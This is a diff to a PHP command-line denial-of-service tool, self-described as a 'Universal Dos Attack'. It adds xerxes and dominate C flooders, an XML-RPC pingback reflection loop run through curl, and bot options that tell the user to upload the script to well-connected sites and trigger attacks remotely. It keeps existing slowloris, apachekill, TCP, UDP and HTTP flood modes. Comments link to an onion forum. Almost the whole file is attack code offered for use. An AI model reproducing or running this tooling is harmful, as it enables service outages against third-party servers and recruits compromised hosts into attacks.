@@ -1,27 +1,33 @@
 <?php
 error_reporting(0);
+// http://lwplxqzvmgu43uff.onion/viewtopic.php?pid=267990#p267990
+// https://github.com/zanyarjamal/zambie/blob/master/zambie.py
+// https://www.youtube.com/watch?v=wiXsJ96v0gE
+
 echo "
 
 ########################
 #                      #
-#     DoS Attack       #
+# Universal Dos Attack #
 #  coded by def_M0use  #
 #  Copyright (c) 2017  #
 ########################
 
 ";
+
+echo "To strengthen the attack, specify the address of the script\n";
+echo "example: -myhost http://localhost/dos.php -shost 1.2.3.4 -stype slowloris -stime 100\n";
+echo "Upload the bot to the site with a wide channel and send the command to start the attack\n";
+echo "example: -bot http://site.com -stype tcp -shost 1.2.3.4 -stime 100\n\n";
 echo "-shost <target> -stime <time> -stype <type>\n";
 echo "example: -shost 1.2.3.4 -stime 100 -stype udp\n";
-echo "1) HTTP GET-POST-HEAD\n";
-echo "2) TCP\n";
-echo "3) refref\n";
-echo "4) apachekill\n";
-echo "5) mixed attack\n";
-echo "6) UDP\n";
-echo "7) Slowloris\n";
-echo "8) perl icmp\n";
-echo "9) perl ldap\n";
-
+echo "usage xerxes: -stype xerxes -shost <target> -port <port>\n";
+echo "usage ldap: -stype ldap -server <server> -target <target> -port <port>\n";
+echo "usage icmp: -stype icmp -shost <target> -port <port> -size <size> -time <time>\n";
+echo "usage dominate: -stype dominate -shost <target> -threads <threads> -limit <limit> -time <time>\n";
+echo "usage xmlrpc: -stype xmlrpc -server <server> -shost <target> -site>\n";
+echo "1) HTTP GET-POST-HEAD ";  echo "2) TCP ";  echo "3) refref ";  echo "4) apachekill ";  echo "5) dominate ";  echo "6) UDP "; 
+echo "7) Slowloris "; echo "8) perl icmp ";  echo "9) perl ldap "; echo "10) xerxes tool "; echo "11) xmlrpc ";
 
 for ($i = 1; $i <= 11; $i++){
     if('-shost'==$argv[$i]){
@@ -64,13 +70,25 @@ for ($i = 1; $i <= 11; $i++){
         $j=$i+1;
         $port = $argv[$j];        
     }
+    if('-bot' == $argv[$i]){
+        $j=$i+1;
+        $bot = $argv[$j];        
+    }
+    if('-threads' == $argv[$i]){
+        $j=$i+1;
+        $threads = $argv[$j];        
+    }
+    if('-limit' == $argv[$i]){
+        $j=$i+1;
+        $limit = $argv[$j];        
+    }
     if('-myhost' == $argv[$i]){
         $j=$i+1;
         $myhost = $argv[$j];        
     }
-    if('-bot' == $argv[$i]){
+    if('-site' == $argv[$i]){
         $j=$i+1;
-        $bot = $argv[$j];        
+        $site = $argv[$j];        
     }
 
 }
@@ -111,8 +129,7 @@ if($type == 'http'){
     }
 }
 
-if($type == 'tcp')
-{
+if($type == 'tcp'){
     $port = 80;
     $timei = time();
     $out = str_repeat("A", $size);
@@ -144,14 +161,14 @@ if($type == 'refref')
     }
 }
 
-if($curl = curl_init()) {
+if($curl = curl_init()) { // bot command
     curl_setopt($curl, CURLOPT_URL, '$bot?$type&ip=$ip&$time=$time');
     curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
     curl_exec($curl);
     curl_close($curl);
   }
 
-if($type == 'slowread')
+if($type == 'slowloris')
 {
     $timei = time();
     $brow = array("", "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.1.749 Yowser/2.5 Safari/537.36", " Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "Opera/9.21 (Windows NT 5.1; U; en)", "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0");
@@ -215,21 +232,39 @@ if($type == 'apachekill'){
     }
     for ($k=0;$k<$num;$k++) {
         $p = "HEAD / HTTP/1.1\r\nHost: $ip\r\nRange:bytes=0-$p\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";    
-        $fp = stream_socket_client("tcp://$ip:$port", $errno, $errstr, 30);
-        if ($fp) { stream_socket_sendto($fp, $p, STREAM_CLIENT_ASYNC_CONNECT);
-            @fclose($socket);
+        $f = fsockopen($ip, 80, $errno, $errstr);
+        fwrite($f, $p);
         }
     }
 }
 
-if($type == 'mixed'){ exec('wget '.$myhost.'?'.$mthd."&ip=".$ip.'&time='.$time); exec('wget '.$myhost.'?'.$mthd1."&ip=".$ip.'&time='.$time); }
-
+// perl
 if($type == 'icmp'){
     exec('perl icmp.pl $ip $port $size $time');
 }
 
 if($type == 'ldap'){
     exec('perl ldap.pl $server $target $port');
+}
+//
+
+// .c
+if($type == 'xerxes'){
+    exec('gcc xerxes.c -o xerxes');
+    exec('./xerxes $ip $port');
+}
+
+if($type == 'dominate'){
+    exec('gcc dominate.c -o dominate');
+    exec('./dominate $ip $threads $limit $time');
+}
+//
+
+if($type == 'xmlrpc'){
+    $timei = time();
+    while ((time() - $timei < $time)) {
+        exec("curl -D -  $server -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>$target</string></value></param><param><value><string>$site</string></value></param></params></methodCall>'");
+    }
 }
 
 ?>
